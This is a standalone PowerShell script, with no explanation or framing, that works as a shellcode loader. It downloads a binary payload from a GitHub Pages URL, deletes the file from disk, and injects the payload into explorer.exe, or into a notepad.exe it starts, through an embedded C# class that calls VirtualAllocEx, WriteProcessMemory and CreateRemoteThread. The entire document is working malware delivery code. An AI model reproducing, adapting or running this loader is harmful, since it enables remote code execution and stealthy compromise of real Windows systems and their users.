# Define shellcode URL
$ShellcodeUrl = "https://p3c0der.github.io/hgfjtfy/loader.bin"

# Check if Injector class already exists
if (-not ([System.Management.Automation.PSTypeName]'Injector').Type) {
    # Define necessary function imports
    $functionDeclarations = @'
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    public static class Injector {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        public static void Inject(byte[] shellcode, int processId) {
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId); // PROCESS_ALL_ACCESS
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            int bytesWritten;
            WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten);
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
'@

    # Add Injector class
    Add-Type -TypeDefinition $functionDeclarations -Language CSharp
}

# Download shellcode from the direct link
$outputFile = "loader.bin"
Invoke-WebRequest -Uri $ShellcodeUrl -OutFile $outputFile

# Load shellcode into memory
$shellcode = [System.IO.File]::ReadAllBytes($outputFile)

# Delete the downloaded shellcode file
Remove-Item $outputFile

# Try injecting into explorer.exe
$explorerProcess = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
if ($explorerProcess) {
    [Injector]::Inject($shellcode, $explorerProcess.Id)
} else {
    Write-Host "explorer.exe not found, injecting into notepad.exe"
    $notepadProcess = Start-Process -FilePath "notepad.exe" -PassThru
    [Injector]::Inject($shellcode, $notepadProcess.Id)
}
